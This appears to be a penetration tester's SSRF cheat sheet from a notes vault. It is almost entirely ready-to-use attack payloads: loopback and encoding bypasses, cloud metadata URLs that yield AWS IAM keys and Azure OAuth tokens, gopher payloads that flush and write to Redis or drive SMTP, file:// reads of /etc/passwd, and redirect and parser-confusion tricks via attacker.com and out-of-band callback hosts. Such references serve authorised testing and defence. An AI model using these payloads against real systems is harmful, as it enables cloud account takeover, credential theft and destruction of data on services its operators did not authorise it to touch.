---
tags: [pentest, ssrf, web, cloud, initial-access]
phase: 5
---
# SSRF Cheats

Server-Side Request Forgery: the app makes an HTTP request you control. Pivot inward.

[[06 - Gaining Access/00 - README|Folder index]]

## Identifying

Look for URL-taking parameters:

```text
?url=
?next=
?target=
?dest=
?image=
?proxy=
?fetch=
?webhook=
```

## Quick test

```text
?url=http://10.10.14.5/  ← does your listener get a hit?
```

If yes → SSRF confirmed. Now pivot.

## Pivot internal

```text
?url=http://127.0.0.1
?url=http://127.0.0.1:22
?url=http://localhost:8080/
?url=http://[::]:80           ← IPv6 loopback bypass
?url=http://0.0.0.0:80
?url=http://0:80
?url=http://127.1
?url=http://127.0.0.0.1.nip.io   ← DNS rebinding fallback
```

## Cloud metadata endpoints

| Cloud | URL | Notes |
| --- | --- | --- |
| **AWS** (IMDSv1) | `http://169.254.169.254/latest/meta-data/` | Returns instance metadata |
| **AWS IAM creds** | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | Returns AccessKey + SessionToken |
| **AWS IMDSv2** | Token required | Need `PUT /api/token` first - see below |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/` | Requires header `Metadata-Flavor: Google` |
| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Requires header `Metadata: true` |
| **Azure tokens** | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` | OAuth tokens for managed identity |
| **DigitalOcean** | `http://169.254.169.254/metadata/v1/` |  |
| **Kubernetes** | `http://kubernetes.default.svc:443` | Inside a pod; `/var/run/secrets/kubernetes.io/serviceaccount/token` |

### AWS IMDSv2 (when v1 disabled)

You usually can't do IMDSv2 via SSRF unless the app does both PUT then GET in your control. Test:

```text
?method=PUT&url=http://169.254.169.254/latest/api/token&header=X-aws-ec2-metadata-token-ttl-seconds:21600
```

## Schemes worth trying

```text
file:///etc/passwd
file:///c:/windows/win.ini
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET x 'shell'    ← Redis SSRF
gopher://127.0.0.1:25/_HELO%20attacker                  ← SMTP
dict://127.0.0.1:11211/stats                            ← Memcached
ldap://127.0.0.1:389/
ftp://127.0.0.1:21/
```

## Filter bypass

```text
# Domain → IP bypass
http://2130706433/                  ← integer form of 127.0.0.1
http://0177.0.0.1/                  ← octal
http://0x7f.0.0.1/                  ← hex
http://127.000.000.001/             ← zero-padded

# DNS rebinding (when validator checks IP after resolution)
http://localtest.me/                ← public DNS that resolves to 127.0.0.1
http://customer1.app.local/         ← rebind: returns 1.2.3.4 then 127.0.0.1

# Redirect chains (validator only checks first URL)
http://attacker.com/redirect.php   ← redirects to http://169.254.169.254

# URL parser confusion
http://attacker.com#@127.0.0.1/
http://attacker.com@127.0.0.1/
http://127.0.0.1.attacker.com/      ← if validator is "starts with 127."
```

## Common SSRF impact patterns

```text
1. Read internal services
2. Steal IAM creds from cloud metadata → take over cloud account
3. Exploit unauthenticated internal apps (Redis, Elasticsearch, Kubernetes, RabbitMQ)
4. Internal port scan
5. Bypass IP-allowlisted admin panels (request comes from server's IP)
6. Phishing via internal email (if SMTP open via gopher)
```

## Blind SSRF

When you can't see the response - rely on side channels:

```text
- DNS callbacks (Burp Collaborator, interactsh, requestbin)
- Timing differences
- Different response sizes
```

```bash
interactsh-client                        # public OOB callback server
# Then payload:
?url=http://abc.oast.fun
# Watch interactsh for hits
```

## SSRFmap (automation)

```bash
SSRFmap -r req.txt -p url -m readfiles,portscan,redis,gopher
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| App makes a request but you can't see body | Blind SSRF - use interactsh / OOB. |
| `connection refused` to internal port | Port closed; try others. |
| `disallowed scheme` | Try `gopher://`, `dict://`, `file://`. |
| Cloud creds endpoint returns nothing | IMDSv1 disabled. Try IMDSv2 with PUT token. |

> [!tip] Burp Collaborator / interactsh
> Always have an OOB callback server ready for SSRF testing. Half of all SSRF is blind.
